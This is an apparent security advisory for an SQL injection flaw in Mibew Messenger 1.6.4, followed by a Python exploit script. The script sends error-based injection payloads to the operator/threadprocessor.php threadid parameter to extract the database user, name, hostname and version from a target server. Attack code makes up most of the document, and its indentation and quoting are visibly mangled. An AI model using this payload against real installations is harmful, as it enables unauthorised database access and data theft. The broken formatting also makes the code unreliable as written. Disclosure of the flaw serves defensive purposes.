source: http://www.securityfocus.com/bid/54857/info

Mibew Messenger is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

Mibew Messenger 1.6.4 is vulnerable; other versions may also be affected. 

#!/usr/bin/python
#Author: Ucha Gobejishvili
#Timeline: 2012-08-05 Bug Discovered
#              2012-08-05 Public Disclosured
#Vendor: Mibew Web Messenger (http://mibew.org/ )
#Version: Mibew Messenger 1.6.4
#Demo: http://demo.mibew.org
#Introduction:
#Mibew Messenger (also known as Open Web Messenger) is an open-#source live
support application written in PHP and MySQL. It #enables one-on-one chat
assistance in real-time directly from #your website.

#Abstract:

#Discovered SQL injection Vulnerabilities on the Mibew Messenger #v.1.6.4.
A SQL Injection vulnerability is detected on the Mibew #Messenger v.1.6.4
The vulnerabilities allows an remote attacker #to execute own sql commands
on the affected applicationdbms. #Successful exploitation can result in
dbms, web-server or #application compromise.
# python Mibew.py -p localhost:8080 -t localhost:8500 -d /Patch/

import sys, httplib, urllib2, urllib, re
from optparse import OptionParser

usage = "./%prog [<options>] -t [target] -d [directory]"
usage += "\nExample: ./%prog -p localhost:8080 -t localhost:8500 -d
/coldcal/"

parser = OptionParser(usage=usage)
parser.add_option("-p", type="string",action="store", dest="proxy",
                  help="HTTP Proxy <server:port>")
parser.add_option("-t", type="string", action="store", dest="target",
                  help="The Target server <server:port>")
parser.add_option("-d", type="string", action="store", dest="directory",
                  help="Directory path to the CMS")
(options, args) = parser.parse_args()

def banner():
    print "\n\t|
----------------------------------------------------------- |"
    print "\t|  Mibew Web Messenger SQL Injection Vulnerability|"
    print "\t| |\n"

if len(sys.argv) < 5:
banner()
parser.print_help()
 sys.exit(1)

def getProxy():
try:
pr = httplib.HTTPConnection(options.proxy)
 pr.connect()
proxy_handler = urllib2.ProxyHandler({'http': options.proxy})
 except(socket.timeout):
print "\n(-) Proxy Timed Out"
sys.exit(1)
 except(),msg:
print "\n(-) Proxy Failed"
sys.exit(1)
 return proxy_handler

def setTargetHTTP():
if options.target[0:7] != 'http://':
 options.target = "http://" + options.target
return options.target
 def getRequest(exploit):
if options.proxy:
try:
 proxyfier = urllib2.build_opener(getProxy())
check = proxyfier.open(options.target+options.directory+exploit).read()
 except urllib2.HTTPError, error:
check = error.read()
except socket.error:
 print "(-) Proxy connection failed"
sys.exit(1)
else:
 try:
req = urllib2.Request(options.target+options.directory+exploit)
check = urllib2.urlopen(req).read()
 except urllib2.HTTPError, error:
check = error.read()
except urllib2.URLError:
 print "(-) Target connection failed, check your address"
sys.exit(1)
 return check

basicInfo = {'user: ':'user_name()', 'name: ':'db_name()', 'hostname:
':'host_name()','version: \n\n\t':'@@version'}

def basicSploit(info):
return "/operator/threadprocessor.php?threadid=1+and+1=convert(int," + info
+ ")--"

if __name__ == "__main__":
banner()
options.target = setTargetHTTP()
 print "(+) Exploiting target @: %s" % (options.target+options.directory)
if options.proxy:
 print "\n(+) Testing Proxy..."
print "(+) Proxy @ %s" % (options.proxy)
 print "(+) Building Handler.."

for key in basicInfo:
 getResp = getRequest(basicSploit(basicInfo[key]))
if re.findall("the nvarchar value '", getResp):
 dbInfo = getResp.split('the nvarchar value '')[1].split('' to data type
int')[0]
print "\n(!) Found database %s%s" % (key, dbInfo.rstrip())

